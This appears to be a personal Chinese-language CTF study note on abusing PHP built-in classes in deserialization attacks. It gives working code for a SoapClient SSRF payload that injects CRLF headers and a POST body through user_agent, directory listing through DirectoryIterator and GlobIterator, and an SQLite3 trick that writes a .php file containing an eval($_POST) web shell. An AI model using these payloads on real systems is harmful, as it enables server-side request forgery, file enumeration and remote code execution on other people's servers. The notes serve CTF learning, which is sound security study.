- [PHP 内置类的应用](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0)
- # SoapClient
	- 可以向任意url post任意内容
	- 需要打开对应扩展才能使用
	- ```php
	  <?php
	  $s = "123";
	  $l = strlen($s);
	  $a = new SoapClient(
	    null,
	    array(
	        'uri'=>'bbb',
	        'location'=>'http://127.0.0.1:80/flag.php',
	        'user_agent'=>"test\r\nCookie: PHPSESSID=0mrbj32r0ptfcnf7l6kmmgh1c4\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $l\r\n\r\n$s"
	    )
	  );
	  echo base64_encode(serialize($a));
	  // 利用：$a->notexist();
	  ?>
	  ```
- # Error类:
	- ((62efc5c6-a0d5-4eab-906e-0db03366b1e9))
- # DirectoryIterator
  id:: 6478aaed-922b-471c-b8d6-ec1b0cb0444d
	- 可以读取文件夹
	- ```php
	  $a=new DirectoryIterator("glob:///*");
	  foreach($a as $f){
	  	echo $f.' ';
	  }
	  ```
	- FilesystemIterator与之类似
- # GlobIterator
	- 可以使用glob读取文件夹
	- ```php
	  <?php
	  highlight_file(__file__);
	  $dir = '/*';
	  $a = new GlobIterator($dir);
	  foreach($a as $f){
	      echo($f->__toString().'<br>');
	  }
	  ?>
	  ```
- # SplFileObject
	- 可以读取文件，支持伪协议
	- 例子：[[CTF/WP/GDOUCTF 2023 反方向的钟]]
- # SQLite
	- 可以实现文件创建/写入
	- ```php
	  <?php
	  // 创建或连接数据库
	  $db = new SQLite3('test.php');
	  
	  // 创建新表
	  $query = 'CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, email TEXT)';
	  $db->exec($query);
	  
	  // 向表中添加数据
	  $query = 'INSERT INTO users (username, email) VALUES (\'TestUser\', \'<?php eval($_POST["data"]);\')';
	  $db->exec($query);
	  
	  // 关闭数据库连接
	  $db->close();
	  
	  ```